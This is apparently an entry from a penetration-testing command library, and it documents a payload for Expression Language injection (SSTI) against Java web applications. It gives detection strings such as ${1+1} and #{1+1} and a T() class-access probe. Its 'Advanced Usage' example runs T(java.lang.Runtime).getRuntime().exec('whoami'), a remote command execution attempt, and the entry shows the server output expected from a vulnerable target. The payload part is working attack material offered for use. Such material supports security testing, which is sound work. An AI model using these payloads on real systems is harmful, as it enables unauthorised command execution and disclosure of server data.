---
id: 812ad185-e2a9-4003-bd1d-338f0e61bf3c
name: inject-basic-el-expressions
type: command
executor: bash
data: '"${<property>}\n${1+1}\n\n#{<expression string>}\n#{1+1}\n\nT(<javaclass>)"'
output: null
created_at: '2023-04-06T03:56:38.949036+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - el-injection
  - ssti
verified: true
validated: true
---

# inject-basic-el-expressions

## Command

```bash
"${<property>}\n${1+1}\n\n#{<expression string>}\n#{1+1}\n\nT(<javaclass>)"
```

## Description

This command generates a multi-line payload string for testing basic EL injection in Java web applications. It includes examples of immediate evaluation (${}), deferred evaluation (#{ }), and static class access (T()). Use this as input to vulnerable parameters to confirm EL processing and evaluate expressions server-side.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $<property> | EL property or implicit object to access (e.g., pageContext.request.method) | Yes |
| $<expression string> | Deferred EL expression to evaluate (e.g., system['user.name']) | Yes |
| $<javaclass> | Fully qualified Java class name for static access (e.g., java.lang.System) | Yes |

## Examples

### Basic Usage

```bash
"${pageContext.request.remoteAddr}\n${1+1}\n\n#{system['java.version']}\n#{1+1}\n\nT(java.lang.Math)"
```

This outputs the client's IP, '2', Java version, another '2', and Math class reference.

### Advanced Usage

```bash
"${sessionScope['user']}\n${'a'+'b'}\n\n#{T(java.lang.Runtime).getRuntime().exec('whoami')}\n#{2*3}\n\nT(java.io.File)"
```

Tests session access, string concat, potential RCE, multiplication, and File class.

## Expected Output

When injected into a vulnerable EL context, the server evaluates and returns results like:

Client IP: 192.168.1.100
2

Java version: 11.0.1
2

class java.lang.Math

Literal output without evaluation indicates no vulnerability.

## Related

- [[procedures/Basic-EL-Injection-in-Java-Web-Applications]]
